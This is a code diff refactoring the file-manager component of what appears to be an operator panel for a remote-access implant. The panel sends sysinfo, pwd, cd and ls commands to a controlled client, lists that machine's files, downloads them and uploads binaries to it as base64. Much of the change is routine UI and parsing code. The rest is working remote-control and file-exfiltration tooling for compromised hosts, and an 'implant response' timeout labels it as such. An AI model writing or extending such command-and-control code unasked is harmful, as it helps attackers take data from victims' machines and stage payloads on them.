@@ -1,4 +1,4 @@
-import React, { useState, useEffect, useRef } from 'react';
+import React, { useState, useEffect } from 'react';
 import styled from 'styled-components';
 import { 
   FiFolder, 
@@ -23,6 +23,118 @@ import {
   FiDatabase
 } from 'react-icons/fi';
 import { toast } from 'react-toastify';
+
+/** Wait for next commandResponse for this client matching predicate (or any if omitted). */
+function waitForResponse(socket, clientId, predicate, timeoutMs = 25000) {
+  return new Promise((resolve, reject) => {
+    const to = setTimeout(() => {
+      socket.off('commandResponse', handler);
+      reject(new Error('Timed out waiting for implant response'));
+    }, timeoutMs);
+    function handler(data) {
+      if (!data || data.clientId !== clientId) return;
+      const text = String(data.response ?? '');
+      if (predicate && !predicate(text)) return;
+      clearTimeout(to);
+      socket.off('commandResponse', handler);
+      resolve(text);
+    }
+    socket.on('commandResponse', handler);
+  });
+}
+
+function quoteRemotePath(p, isWindows) {
+  if (!p) return '""';
+  const t = String(p).trim();
+  if (t.startsWith('"') && t.endsWith('"')) return t;
+  const inner = t.replace(/"/g, '');
+  return `"${inner}"`;
+}
+
+function parseDirectoryListing(response, fallbackPath, isWindows) {
+  const raw = String(response || '');
+  const lines = raw.split(/\r?\n/);
+  let dirPath = fallbackPath || '';
+  const files = [];
+
+  for (const line of lines) {
+    const dm = line.match(/^Directory:\s*(.+)$/i);
+    if (dm) dirPath = dm[1].trim();
+  }
+
+  for (const line of lines) {
+    const trimmed = line.trim();
+    if (!trimmed.startsWith('<DIR>') && !trimmed.startsWith('FILE')) continue;
+    const cells = line.split('\t').map((c) => c.trim()).filter((c) => c.length > 0);
+    if (cells.length < 3) continue;
+    const kind = cells[0];
+    if (kind !== '<DIR>' && kind !== 'FILE') continue;
+    const name = cells[1];
+    if (!name || /^Name$/i.test(name) || /^-+$/i.test(name)) continue;
+    const isDirectory = kind === '<DIR>';
+    const size = isDirectory ? '—' : cells[2];
+    const modified = cells[cells.length - 1] || '—';
+    const sep = isWindows ? '\\' : '/';
+    const base = (dirPath || fallbackPath || '').replace(/[\\/]+$/, '');
+    const fullPath = base ? `${base}${sep}${name}` : name;
+    files.push({
+      name,
+      isDirectory,
+      size,
+      modified,
+      path: fullPath,
+      type: getFileTypeStatic(name)
+    });
+  }
+
+  return { dirPath: dirPath || fallbackPath || '', files };
+}
+
+function getFileTypeStatic(filename) {
+  const ext = filename.toLowerCase().split('.').pop();
+  const imageExts = ['jpg', 'jpeg', 'png', 'gif', 'bmp', 'svg', 'ico'];
+  const videoExts = ['mp4', 'avi', 'mov', 'wmv', 'flv', 'webm', 'mkv'];
+  const audioExts = ['mp3', 'wav', 'flac', 'aac', 'ogg', 'wma'];
+  const archiveExts = ['zip', 'rar', '7z', 'tar', 'gz', 'bz2'];
+  const codeExts = ['js', 'ts', 'html', 'css', 'py', 'java', 'cpp', 'c', 'go', 'php'];
+  const docExts = ['txt', 'doc', 'docx', 'pdf', 'rtf'];
+
+  if (imageExts.includes(ext)) return 'image';
+  if (videoExts.includes(ext)) return 'video';
+  if (audioExts.includes(ext)) return 'audio';
+  if (archiveExts.includes(ext)) return 'archive';
+  if (codeExts.includes(ext)) return 'code';
+  if (docExts.includes(ext)) return 'document';
+  return 'file';
+}
+
+function crumbsFromPath(fullPath, isWindows) {
+  if (!fullPath) return [];
+  if (isWindows) {
+    const s = fullPath.replace(/\//g, '\\');
+    const m = s.match(/^([A-Za-z]:)(\\)?(.*)$/);
+    if (!m) return [{ name: s, path: s }];
+    const drive = m[1];
+    const tail = (m[3] || '').split('\\').filter(Boolean);
+    const out = [];
+    let acc = drive + '\\';
+    out.push({ name: drive, path: acc });
+    for (const seg of tail) {
+      acc = acc.replace(/\\+$/, '') + '\\' + seg;
+      out.push({ name: seg, path: acc });
+    }
+    return out;
+  }
+  const norm = fullPath.startsWith('/') ? fullPath : '/' + fullPath;
+  const segs = norm.split('/').filter(Boolean);
+  const out = [];
+  let acc = '';
+  for (const seg of segs) {
+    acc = acc ? acc + '/' + seg : '/' + seg;
+    out.push({ name: seg, path: acc });
+  }
+  return out;
+}
 
 const FileManagerContainer = styled.div`
   background: #0a0a0a;
@@ -318,191 +430,119 @@ const FileManager = ({ client, socket }) => {
   const [searchTerm, setSearchTerm] = useState('');
   const [loading, setLoading] = useState(false);
   const [breadcrumbs, setBreadcrumbs] = useState([]);
-  const [osType, setOsType] = useState('unknown');
-  const commandResponseRef = useRef(null);
+  const [osType, setOsType] = useState('windows');
 
-  // Listen for command responses
-  useEffect(() => {
-    if (!socket) return;
+  const isWindowsOs = () =>
+    String(osType).toLowerCase().includes('windows') || /^[A-Za-z]:\\?/.test(currentPath || '');
 
-    const handleCommandResponse = (data) => {
-      if (data.clientId === client?.id && commandResponseRef.current) {
-        commandResponseRef.current(data.response);
-      }
-    };
-
-    socket.on('commandResponse', handleCommandResponse);
-    return () => socket.off('commandResponse', handleCommandResponse);
-  }, [socket, client]);
-
-  // Initialize file manager when client is selected
-  useEffect(() => {
-    if (client && socket) {
-      // Fetch OS info first to choose safe defaults
-      fetchOsInfo(() => loadCurrentDirectory());
+  const updateBreadcrumbs = (fullPath, winOverride) => {
+    if (!fullPath) {
+      setBreadcrumbs([]);
+      return;
     }
-  }, [client, socket]);
-
-  const fetchOsInfo = (next) => {
-    if (!socket || !client) return next && next();
-    const handler = (data) => {
-      if (data.clientId !== client.id) return;
-      const text = String(data.response || '');
-      const match = text.match(/OS:\s*(\S+)/i);
-      if (match && match[1]) {
-        setOsType(match[1].toLowerCase());
-      }
-      socket.off('commandResponse', handler);
-      next && next();
-    };
-    socket.on('commandResponse', handler);
-    socket.emit('executeCommand', { clientId: client.id, command: 'sysinfo' });
+    const win = winOverride !== undefined ? winOverride : isWindowsOs();
+    setBreadcrumbs(crumbsFromPath(fullPath, win));
   };
 
-  const loadCurrentDirectory = () => {
-    if (!client || !socket) return;
-    setLoading(true);
-    commandResponseRef.current = (response) => {
-      try {
-        const path = String(response || '').trim();
-        const invalid = !path || /^Command failed/i.test(path);
-        const defaultPath = osType.includes('windows') ? 'C:\\' : '/';
-        const nextPath = invalid ? defaultPath : path;
-        setCurrentPath(nextPath);
-        updateBreadcrumbs(nextPath);
-        // Chain: now list files in this directory
-        loadFiles(nextPath);
-      } catch (e) {
-        setLoading(false);
-      }
-    };
-    socket.emit('executeCommand', {
-      clientId: client.id,
-      command: 'pwd'
-    });
-  };
-
-  const loadFiles = (path = '') => {
-    if (!client || !socket) return;
-    
-    setLoading(true);
-    // Step 1: cd into the path (if provided)
-    let targetPath = path || currentPath;
-    // Normalize Windows drive roots and slashes
-    if (osType.includes('windows')) {
-      if (typeof targetPath === 'string') {
-        targetPath = targetPath.trim().replace(/\//g, '\\');
-        if (/^[a-zA-Z]:$/.test(targetPath)) {
-          targetPath = `${targetPath}\\`;
-        }
-      }
-    }
-    const sendList = () => {
-      commandResponseRef.current = (response) => {
-        parseDirectoryResponse(response, targetPath);
-        setLoading(false);
-      };
-      const listCmd = targetPath ? `ls "${targetPath}"` : 'ls';
-      socket.emit('executeCommand', { clientId: client.id, command: listCmd });
-    };
-    if (targetPath) {
-      // Run cd first; ignore its output, then list
-      const cdCmd = `cd ${targetPath}`;
-      const cdHandler = () => {
-        socket.off('commandResponse', cdHandler);
-        sendList();
-      };
-      socket.on('commandResponse', cdHandler);
-      socket.emit('executeCommand', { clientId: client.id, command: cdCmd });
-      // Safety timeout fallback to ensure we still list
-      setTimeout(() => {
-        try { socket.off('commandResponse', cdHandler); } catch (e) {}
-        sendList();
-      }, 1200);
-    } else {
-      sendList();
-    }
-  };
-
-  const parseDirectoryResponse = (response, targetPath = '') => {
-    try {
-      const lines = response.split('\n');
-      let path = '';
-      let fileList = [];
-
-      // Extract directory path from first line
-      for (const line of lines) {
-        if (line.startsWith('Directory:')) {
-          path = line.replace('Directory:', '').trim();
-          break;
-        }
-      }
-
-      if (!path) {
-        path = targetPath || currentPath || '';
-      }
-
-      // Parse file entries
-      for (const line of lines) {
-        if (line.includes('\t') && (line.includes('<DIR>') || line.includes('FILE'))) {
-          const parts = line.split('\t');
-          if (parts.length >= 4) {
-            const type = parts[0].trim();
-            const name = parts[1].trim();
-            const size = parts[2].trim();
-            const modified = parts[3].trim();
-
-            if (name && name !== '') {
-              fileList.push({
-                name: name,
-                isDirectory: type === '<DIR>',
-                size: size,
-                modified: modified,
-                path: buildPath(path, name),
-                type: getFileType(name)
-              });
-            }
-          }
-        }
-      }
-
-      if (path) setCurrentPath(path);
-      setFiles(fileList);
-      updateBreadcrumbs(path);
-    } catch (error) {
-      console.error('Error parsing directory response:', error);
-      toast.error('Failed to parse directory listing');
+  const applyListing = (responseText, pathFallback, winOverride) => {
+    const win = winOverride !== undefined ? winOverride : isWindowsOs();
+    const { dirPath, files: parsed } = parseDirectoryListing(responseText, pathFallback, win);
+    if (/^Error reading directory/i.test(String(responseText))) {
+      toast.error(String(responseText).split('\n')[0]);
       setFiles([]);
+      return;
+    }
+    const dir = dirPath || pathFallback || '';
+    if (dir) setCurrentPath(dir);
+    setFiles(parsed);
+    updateBreadcrumbs(dir || pathFallback, win);
+  };
+
+  const refreshListing = async (targetPath) => {
+    if (!client || !socket) return;
+    setLoading(true);
+    try {
+      const win = isWindowsOs();
+      const dest = targetPath != null ? String(targetPath).trim() : String(currentPath || '').trim();
+      if (dest) {
+        const cdCmd = `cd ${quoteRemotePath(dest, win)}`;
+        socket.emit('executeCommand', { clientId: client.id, command: cdCmd });
+        await waitForResponse(
+          socket,
+          client.id,
+          (t) =>
+            /Current directory changed to:/i.test(t) ||
+            /Error changing directory/i.test(t)
+        );
+      }
+      socket.emit('executeCommand', { clientId: client.id, command: 'ls' });
+      const listing = await waitForResponse(
+        socket,
+        client.id,
+        (t) => t.includes('Directory:') || /^Error reading directory/i.test(t)
+      );
+      applyListing(listing, dest, isWindowsOs());
+    } catch (e) {
+      toast.error(e.message || 'Failed to load directory');
+      setFiles([]);
+    } finally {
+      setLoading(false);
     }
   };
 
-  const getSep = () => (osType.includes('windows') ? '\\' : '/');
+  useEffect(() => {
+    if (!client || !socket) return;
+    let cancelled = false;
 
-  const buildPath = (base, name) => {
-    const sep = getSep();
-    if (!base) return name;
-    // If base already ends with sep, avoid double
-    const normalized = base.endsWith(sep) ? base.slice(0, -1) : base;
-    return `${normalized}${sep}${name}`;
-  };
+    (async () => {
+      setLoading(true);
+      try {
+        socket.emit('executeCommand', { clientId: client.id, command: 'sysinfo' });
+        const sys = await waitForResponse(socket, client.id, (t) =>
+          /Architecture:/i.test(t)
+        );
+        if (cancelled) return;
+        const m = sys.match(/OS:\s*(\S+)/i);
+        const ost = m && m[1] ? m[1].toLowerCase() : 'windows';
+        setOsType(ost);
+        const winOs = ost.includes('windows');
 
-  const getFileType = (filename) => {
-    const ext = filename.toLowerCase().split('.').pop();
-    const imageExts = ['jpg', 'jpeg', 'png', 'gif', 'bmp', 'svg', 'ico'];
-    const videoExts = ['mp4', 'avi', 'mov', 'wmv', 'flv', 'webm', 'mkv'];
-    const audioExts = ['mp3', 'wav', 'flac', 'aac', 'ogg', 'wma'];
-    const archiveExts = ['zip', 'rar', '7z', 'tar', 'gz', 'bz2'];
-    const codeExts = ['js', 'ts', 'html', 'css', 'py', 'java', 'cpp', 'c', 'go', 'php'];
-    const docExts = ['txt', 'doc', 'docx', 'pdf', 'rtf'];
+        socket.emit('executeCommand', { clientId: client.id, command: 'pwd' });
+        const pwdText = await waitForResponse(socket, client.id, (t) => {
+          const s = String(t).trim();
+          if (/Architecture:/i.test(s) || /Hostname:/i.test(s)) return false;
+          return (
+            /^[A-Za-z]:\\|^\/|^\./.test(s) ||
+            /^Error/i.test(s) ||
+            (s.length > 0 && s.length < 400 && !s.includes('\n'))
+          );
+        });
+        if (cancelled) return;
+        const p = String(pwdText).trim();
+        let cwd = p;
+        if (/^[A-Za-z]:$/.test(cwd)) cwd += '\\';
+        if (!/^Error/i.test(cwd)) {
+          setCurrentPath(cwd);
+          updateBreadcrumbs(cwd, winOs);
+        }
 
-    if (imageExts.includes(ext)) return 'image';
-    if (videoExts.includes(ext)) return 'video';
-    if (audioExts.includes(ext)) return 'audio';
-    if (archiveExts.includes(ext)) return 'archive';
-    if (codeExts.includes(ext)) return 'code';
-    if (docExts.includes(ext)) return 'document';
-    return 'file';
-  };
+        socket.emit('executeCommand', { clientId: client.id, command: 'ls' });
+        const listing = await waitForResponse(socket, client.id, (t) =>
+          t.includes('Directory:') || /^Error reading directory/i.test(t)
+        );
+        if (cancelled) return;
+        applyListing(listing, cwd, winOs);
+      } catch (e) {
+        if (!cancelled) toast.error(e.message || 'Could not open file manager');
+      } finally {
+        if (!cancelled) setLoading(false);
+      }
+    })();
+
+    return () => {
+      cancelled = true;
+    };
+  }, [client?.id, socket]);
 
   const getFileIcon = (file) => {
     if (file.isDirectory) {
@@ -534,32 +574,9 @@ const FileManager = ({ client, socket }) => {
     }
   };
 
-  const updateBreadcrumbs = (path) => {
-    if (!path) {
-      setBreadcrumbs([]);
-      return;
-    }
-
-    const sep = getSep();
-    const parts = path.split(sep).filter(p => p !== '');
-    const crumbs = [];
-    
-    // Add root
-    crumbs.push({ name: 'Root', path: osType.includes('windows') ? 'C:\\' : '/' });
-    
-    // Add path parts
-    let currentPath = osType.includes('windows') ? 'C:\\' : '';
-    for (const part of parts) {
-      currentPath += (currentPath && !currentPath.endsWith(getSep()) ? getSep() : '') + part;
-      crumbs.push({ name: part, path: currentPath });
-    }
-    
-    setBreadcrumbs(crumbs);
-  };
-
   const navigateToPath = (path) => {
-    setCurrentPath(path);
-    loadFiles(path);
+    if (!path) return;
+    refreshListing(path);
   };
 
   const goBack = () => {
@@ -573,35 +590,58 @@ const FileManager = ({ client, socket }) => {
     if (file.isDirectory) {
       navigateToPath(file.path);
     } else {
-      handleFileDownload(file.name);
+      handleFileDownload(file.path);
     }
   };
 
   const handleFileUpload = () => {
+    if (!client || !socket) return;
     const input = document.createElement('input');
     input.type = 'file';
     input.multiple = true;
-    input.onchange = (e) => {
-      const files = Array.from(e.target.files);
-      files.forEach(file => {
-        // Upload logic would go here
-        toast.success(`Uploading ${file.name}...`);
+    input.onchange = (ev) => {
+      const picked = Array.from(ev.target.files || []);
+      picked.forEach((file) => {
+        const reader = new FileReader();
+        reader.onload = () => {
+          try {
+            const str = String(reader.result);
+            const comma = str.indexOf(',');
+            const base64 = comma >= 0 ? str.slice(comma + 1) : str;
+            const remotePath = (() => {
+              const sep = isWindowsOs() ? '\\' : '/';
+              const base = String(currentPath || '').replace(/[\\/]+$/, '');
+              const safe = file.name.replace(/[<>:"|?*]/g, '_');
+              return base ? `${base}${sep}${safe}` : safe;
+            })();
+            socket.emit('uploadBinaryToClient', {
+              clientId: client.id,
+              remotePath,
+              fileBase64: base64
+            });
+            toast.info(`Queued upload: ${file.name}`);
+          } catch (err) {
+            toast.error(err.message || 'Upload failed');
+          }
+        };
+        reader.onerror = () => toast.error(`Read failed: ${file.name}`);
+        reader.readAsDataURL(file);
       });
+      ev.target.value = '';
     };
     input.click();
   };
 
-  const handleFileDownload = (fileName) => {
-    if (!client || !socket) return;
-    
+  const handleFileDownload = (remotePath) => {
+    if (!client || !socket || !remotePath) return;
     socket.emit('downloadFile', {
       clientId: client.id,
-      filename: fileName
+      filename: remotePath
     });
-    toast.success(`Downloading ${fileName}...`);
+    toast.success('Download started');
   };
 
-  const filteredFiles = files.filter(file => 
+  const filteredFiles = files.filter(file =>
     file.name.toLowerCase().includes(searchTerm.toLowerCase())
   );
 
@@ -640,7 +680,7 @@ const FileManager = ({ client, socket }) => {
             value={searchTerm}
             onChange={(e) => setSearchTerm(e.target.value)}
           />
-          <ActionButton onClick={loadCurrentDirectory} disabled={loading}>
+          <ActionButton onClick={() => refreshListing()} disabled={loading}>
             <FiRefreshCw />
             Refresh
           </ActionButton>
@@ -648,6 +688,10 @@ const FileManager = ({ client, socket }) => {
       </Header>
 
       <Toolbar>
+        <div style={{ color: '#888', fontSize: '12px', fontFamily: 'monospace', maxWidth: '45vw', overflow: 'hidden', textOverflow: 'ellipsis', whiteSpace: 'nowrap' }} title={currentPath}>
+          {currentPath || '—'}
+        </div>
+        <div style={{ display: 'flex', alignItems: 'center', gap: 12 }}>
         <ActionButton onClick={goBack} disabled={breadcrumbs.length <= 1}>
           <FiArrowLeft />
           Back
@@ -674,6 +718,7 @@ const FileManager = ({ client, socket }) => {
             List
           </ViewButton>
         </ViewControls>
+        </div>
       </Toolbar>
 
       <FileArea>
@@ -691,19 +736,68 @@ const FileManager = ({ client, socket }) => {
         ) : viewMode === 'grid' ? (
           <FileGrid>
             {filteredFiles.map((file, index) => (
-              <FileItem key={index} onClick={() => handleFileClick(file)}>
-                <FileIcon color={getFileIconColor(file)}>
-                  {getFileIcon(file)}
-                </FileIcon>
-                <FileName>{file.name}</FileName>
-                <FileSize>{file.size}</FileSize>
+              <FileItem key={`${file.path}-${index}`}>
+                <div
+                  role="button"
+                  tabIndex={0}
+                  onClick={() => handleFileClick(file)}
+                  onKeyDown={(e) => e.key === 'Enter' && handleFileClick(file)}
+                  style={{ cursor: 'pointer' }}
+                >
+                  <FileIcon color={getFileIconColor(file)}>
+                    {getFileIcon(file)}
+                  </FileIcon>
+                  <FileName>{file.name}</FileName>
+                  <FileSize>{file.size}</FileSize>
+                </div>
+                <div
+                  style={{
+                    display: 'flex',
+                    gap: 6,
+                    justifyContent: 'center',
+                    marginTop: 10,
+                    flexWrap: 'wrap'
+                  }}
+                >
+                  {file.isDirectory ? (
+                    <ActionButton
+                      type="button"
+                      onClick={(e) => {
+                        e.stopPropagation();
+                        navigateToPath(file.path);
+                      }}
+                    >
+                      Open
+                    </ActionButton>
+                  ) : (
+                    <ActionButton
+                      type="button"
+                      onClick={(e) => {
+                        e.stopPropagation();
+                        handleFileDownload(file.path);
+                      }}
+                    >
+                      <FiDownload />
+                    </ActionButton>
+                  )}
+                  <ActionButton
+                    type="button"
+                    onClick={(e) => {
+                      e.stopPropagation();
+                      navigator.clipboard.writeText(file.path);
+                      toast.success('Path copied');
+                    }}
+                  >
+                    <FiCopy />
+                  </ActionButton>
+                </div>
               </FileItem>
             ))}
           </FileGrid>
         ) : (
           <FileList>
             {filteredFiles.map((file, index) => (
-              <FileRow key={index} onClick={() => handleFileClick(file)}>
+              <FileRow key={`${file.path}-${index}`} onClick={() => handleFileClick(file)}>
                 <FileRowIcon color={getFileIconColor(file)}>
                   {getFileIcon(file)}
                 </FileRowIcon>
@@ -715,19 +809,35 @@ const FileManager = ({ client, socket }) => {
                   </FileRowDetails>
                 </FileRowInfo>
                 <FileRowActions>
-                  {!file.isDirectory && (
-                    <ActionButton onClick={(e) => {
-                      e.stopPropagation();
-                      handleFileDownload(file.name);
-                    }}>
+                  {file.isDirectory ? (
+                    <ActionButton
+                      type="button"
+                      onClick={(e) => {
+                        e.stopPropagation();
+                        navigateToPath(file.path);
+                      }}
+                    >
+                      Open
+                    </ActionButton>
+                  ) : (
+                    <ActionButton
+                      type="button"
+                      onClick={(e) => {
+                        e.stopPropagation();
+                        handleFileDownload(file.path);
+                      }}
+                    >
                       <FiDownload />
                     </ActionButton>
                   )}
-                  <ActionButton onClick={(e) => {
-                    e.stopPropagation();
-                    navigator.clipboard.writeText(file.path);
-                    toast.success('Path copied to clipboard');
-                  }}>
+                  <ActionButton
+                    type="button"
+                    onClick={(e) => {
+                      e.stopPropagation();
+                      navigator.clipboard.writeText(file.path);
+                      toast.success('Path copied to clipboard');
+                    }}
+                  >
                     <FiCopy />
                   </ActionButton>
                 </FileRowActions>
